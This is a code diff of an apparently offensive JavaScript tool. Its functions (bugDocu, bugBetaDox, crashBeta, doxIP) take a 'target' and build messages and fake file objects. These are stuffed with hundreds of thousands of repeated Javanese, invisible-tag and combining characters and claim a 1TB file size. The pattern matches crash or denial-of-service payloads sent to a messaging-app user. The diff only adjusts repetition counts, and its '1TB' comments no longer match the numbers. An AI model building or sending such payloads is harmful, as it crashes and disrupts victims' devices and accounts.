@@ -1596,11 +1596,11 @@ async function blank(target) {
 
 async function bugDocu(target) {
   try {
-    const pesan = "@0".repeat(70000);
+    const pesan = "@0".repeat(30000);
     const file = {
       name: "ꦾ".repeat(200000) + ".txt",
-      size: 1099511627776, // 1TB
-      data: "0".repeat(1099511627776),
+      size: 1099511627, // 1TB
+      data: "0".repeat(109951175),
     };
     const message = {
       text: pesan,
@@ -1622,8 +1622,8 @@ async function bugBetaDox(target) {
     const pesan = "ꦽ".repeat(200000);
     const file = {
       name: "ꦾ".repeat(100000) + ".txt",
-      size: 1099511627776, // 1TB
-      data: "0".repeat(1099511627776),
+      size: 1099511627, // 1TB
+      data: "0".repeat(10995116),
     };
     const message = {
       text: pesan,
@@ -1666,11 +1666,11 @@ async function crashBeta(target) {
 
 async function doxIP(target) {
   try {
-    const pesan = "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(150000);
+    const pesan = "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(50000);
     const file = {
       name: "󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫󠀬󠀭󠀳󠀳󠀳󠀵󠀵󠀵󠀵‫‪‫҈꙲꙲".repeat(150000) + ".txt",
-      size: 1099511627776, // 1TB
-      data: "0".repeat(1099511627776),
+      size: 109951162, // 1TB
+      data: "0".repeat(1099511627),
     };
     const message = {
       text: pesan,
